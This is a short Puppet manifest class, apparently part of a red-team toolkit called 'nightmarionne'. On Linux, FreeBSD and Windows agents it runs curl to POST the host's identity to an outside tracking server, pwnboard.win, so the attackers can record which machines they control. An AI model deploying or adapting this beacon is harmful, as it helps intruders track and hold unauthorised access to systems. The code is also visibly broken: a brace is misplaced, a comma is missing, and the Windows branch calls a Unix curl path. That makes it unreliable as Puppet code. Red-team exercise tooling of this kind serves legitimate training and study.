class pwnboard {
    if $::osfamily in ['Debian','RedHat'] {
      exec { 'pwnboard':
	      command => ['/usr/bin/curl', '-X', 'POST', 'http://pwnboard.win/pwn/boxaccess', '-H' 'Content-Type: application/json', '-d', "{\"ip\":\"${trusted['certname']}\",\"application\":\"nightmarionne\"}"]
      }
    } elsif $::osfamily == 'FreeBSD' {
      exec { 'pwnboard':
	      command => ['/usr/local/bin/curl', '-X', 'POST', 'http://pwnboard.win/pwn/boxaccess', '-H' 'Content-Type: application/json', '-d', "{\"ip\":\"${trusted['certname']}\",\"application\":\"nightmarionne\"}"]
      }
    }
    } elsif $::osfamily == 'windows' {
      exec { 'pwnboard':
        path => 'C:/Windows/System32',
	      command => ['/usr/bin/curl', '-X', 'POST', 'http://pwnboard.win/pwn/boxaccess', '-H' 'Content-Type: application/json', '-d', "{\"ip\":\"${trusted['certname']}\",\"application\":\"nightmarionne\"}"]
      }
    }
}
